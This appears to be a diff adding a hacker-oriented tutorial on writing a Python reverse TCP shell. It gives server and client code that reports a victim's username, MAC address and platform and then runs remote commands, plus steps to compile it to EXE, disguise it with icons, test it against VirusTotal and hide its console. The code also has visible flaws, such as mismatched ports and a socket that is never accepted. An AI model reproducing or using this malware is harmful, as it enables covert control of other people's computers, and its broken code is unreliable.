@@ -1,0 +1,152 @@
+Intro:
+
+Let's remember what is the most common technique hackers use to take over a device? The answer to such a question will not take long to wait.
+Viruses are the main weapon of every hacker. There is a huge amount of malware, ranging from stillers to botnets capable of controlling millions of devices.
+But in this article I will tell you the easiest way to access the console of another computer using Python code.
+
+
+Work plan
+We begin our work as always with setting the right plan. It will make it easier for you to navigate the text and understand what you already know, and what knowledge is kept secret from you.
+    Reverse TCP shell.
+        - What are TCP sockets.
+        - Firewalls and connection blocking.
+        - Parts of the reverse shell.
+        - The client-server model.
+    Creating a TCP server in Python.
+    We are writing the reverse shell of the client.
+    Compilation and testing on the detector.
+    Summing up the results.
+So now we have a plan and we will stick to it. In the following articles I will tell you how to improve this program, but now let's get to work.
+
+
+Reverse TCP Shell
+TCP sockets are the basis of this type of shell. This is a kind of foundation that network applications use.
+For example, SSH (Secure Shell) uses TCP sockets to establish a secure connection with a remote machine and then send it certain commands.
+In this case, the device that makes the connection acts as an SSH server.
+The receiving party is an SSH client and has a specific program that allows the server to execute commands remotely. That is, a hacker hacking the device loads the client shell and gets control of the system.
+But if we talk about everything on a huge scale, then you can face some troubles.
+
+For example, organizations use routers with a firewall function and Network Address Translation (Network Address Translation) to protect against hacking of computers in their office.
+This technology is also used when creating virtual machines. It allows you to isolate it from the external environment and make it safer.
+However, there is a little trick in the work of NAT - we cannot connect to the network while outside it, but devices inside it can connect to us.
+
+To take possession of the device, the hacker must force the hacked device to connect to his computer, then he will be able to control it bypassing the firewall. Some reverse shells are able to mask their traffic to avoid detection, but I will talk about these methods of protection in another article. Now let's figure out what the reverse shell consists of.
+It has two leading components: the client part, which allows the hacker to connect to the device and further manage it, and the server part, which waits for connection from the victim's computer. When the client is started, the operating system is asked to create a new socket. After that, the OS assigns a specific port number to this socket and associates it with the reverse shell. While the server asks the client for a specific number to connect to. The combination of the victim's port and IP address allows other devices to identify the TCP server. Therefore, when creating servers, people try to use long ports to avoid conflicts and extraneous connections.
+If you didn't know, then the maximum number you can set to the port is 65535.
+This connection model is called "client -server". It is based on most of the Internet network. For example, when you search for something using Google, your computer connects to the corporation's TCP server, which runs on port 80. A peer-to-peer network (peertopeer) also serves as an analogue of such a model. P2P uses direct communication with customers. Video chats and Torrent services use this technology everywhere. Now that I've explained to you all the main points of working with the reverse shell, let's start creating our own version in Python.
+
+
+Creating a TCP server in Python
+To work, you will need to install Python 3.10 or higher, as well as the PyCharm development environment.
+If you already have a program for writing code (you can even use a notepad), then let's start writing code.
+Our first step will be the server part of the reverse shell, so you will need to create a file with the name TCPServer.py.
+Open it and first of all import all the required modules:
+
+from socket import *
+import sys
+Next, let's designate two variables, in them we will put the port for wiretapping and our IP address - all devices will be connected to it.
+serverPort = 3851
+serverName = sys.argv[1]
+Let me remind you that the sys.argv function accesses the command line, so when you start, you will need to specify your IP address.
+Now we need to set the rules for our server, and also raise it using the bind() command.
+serverSocket = socket(AF_INET, SOCK_STREAM)
+serverSocket.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
+serverSocket.bind((serverName, serverPort))
+serverSocket.listen(1)
+Using the AF_INET parameter, a regular socket is created, and SOCK_STREAM allows you to turn it into TCP.
+We use setsockopt so that our program can interact with the socket a large number of times.
+Next, we raise the server and start listening using the listen() function. If you leave the serverName variable empty, the default IP address of the computer will be used.
+
+The next step is to create a variable that will be responsible for transmitting information. Here we need to determine the size of the message and try to send it.
+Since the encoding in the system that connects to the server is not configured, we will try to fix it so that all the text is output in the correct form. We do it as follows.
+message = connectionSocket.recv(8192)
+connectionSocket.send("chcp 65001".encode())
+print(message)
+print("When you're finished enter exit")
+As I said, the first in our list is the creation of a variable. Message is responsible for the size of the message transmitted to the computer. Next, we connect and send a message, encode it in advance. In Windows, chcp is responsible for changing the encoding, I change it to UTF-8. Thus, the entire text will be displayed in English.
+Next, we output a response message and tell the user to use the exit command after completing the work.
+We have decided on the size of the commands, now we need to create the concept of commands for transmission. Let's create a variable of type string.
+Next, we will pass it to the while loop and receive the text from the user. In the loop, it is also sent to the victim's car and executed there. We will intercept exceptions in advance in case of a broken connection. If the user uses the exit command, the program will terminate.
+We implement this as follows:
+command = ""
+while command != "exit":
+    command = input("cmd> ")
+    try:
+        connectionSocket.send(command.encode())
+        message = connectionSocket.recv(8192).decode()
+        print(message)
+    except ConnectionResetError or ConnectionAbortedError:
+        print("Oops! Someone disconnected the connection")
+        connectionSocket.close()
+        raise SystemExit
+
+The finishing touch of our server will be the closing of the connection and the remote shutdown of the client program.
+connectionSocket.shutdown(SHUT_RDWR)
+connectionSocket.close()
+Great! We launch our miracle and see the welcome window. But we won't be able to connect to anything, since we haven't written a client program.
+Therefore, we will create it and configure the connection.
+
+Writing the reverse shell of the client
+So, to write the client part of our server, we will use the same library.
+To identify each device, I will collect the most standard information about the victim's computer.
+First of all, these are: the IP and MAC addresses of the device, as well as the user name and operating system.
+Although my shell is initially aimed at working with Windows, it can be easily redone for Linux.
+
+Let's start working first of all with importing the required libraries.
+import sys
+from subprocess import Popen, PIPE
+from socket import *
+from uuid import getnode as get_mac
+import platform
+import getpass
+The next stage is no different from what we went through at the time of creating the server, and this is the creation of variables with a port and an address to connect to.
+serverName = sys.argv[1]
+serverPort = 3859
+You will also need to find out the initial information about the system. To do this, we will create four variables that will be responsible for this.
+We do everything as follows:
+ip = gethostbyname(gethostname())
+mac = get_mac()
+ost = platform.uname()
+name = getpass.getuser()
+The first one is responsible for the IP address of the target, then we will find out the MAC address and the name of the platform along with the user name.
+Such information will be useful to us to identify the target. Now we have to contact our server and send the received information.
+clientSocket = socket(AF_INET, SOCK_STREAM)
+clientSocket.connect((serverName, serverPort))
+clientSocket.send(f"Username: {name}, "
+                  f"MAC Address: {mac}, "
+                  f"Platform: {ost.system}.".encode())
+Do not forget about setting the maximum transfer of information in bits.
+command = clientSocket.recv(8192).decode()
+We drive everything into a while loop, as we did with our server. Next, we intercept an unnecessary exception that the user can see and terminate our client program.
+I have provided the code of all this below:
+while command != "exit":
+    try:
+        proc = Popen(command.split(" "), stdout=PIPE, stderr=PIPE, shell=True)
+        result, err = proc.communicate()
+        clientSocket.send(result)
+        command = (clientSocket.recv(8192).decode())
+    except ConnectionResetError:
+        raise SystemExit
+Now we end our program by closing the connection and proceed to compilation.
+clientSocket.close()
+Let me remind you that you can replace the serverName variable with the IP address of your device.
+Let's move on to converting our python files to EXE format.
+
+Compiling and checking for detection
+To convert to an executable file (.exe), I use Pyinstaller, so let's start with the installation. You can do this using the pip manager:
+pip install pyinstaller
+Next, open the console and transfer our files to any convenient location. Go to the folder and write the following command:
+pyinstaller --onefile *path_to_file*
+Thus, we collect both files. If you have not specified the correct IP in the programs, they will automatically close when you try to start.
+Let me remind you that you can find out your address using ipconfig.
+For masking, you can put icons on files using the -i flag.
+After completing our compilation, we will try to upload all the work to VirusTotal and check how well everything works.
+
+
+Summing up the results:
+
+In this article, I tried to tell you as clearly and simply as possible about how to create your own reverse shell using the Python programming language.
+You can modify such code forever. One of the main problems of such a shell is that it is not hidden from the user's eyes in any way.
+A hanging console window leads to suspicions. When building, you need to use the --noconsole function, thereby hiding the work of the code from the client's eyes.
+
+~ Enjoy The Movement!
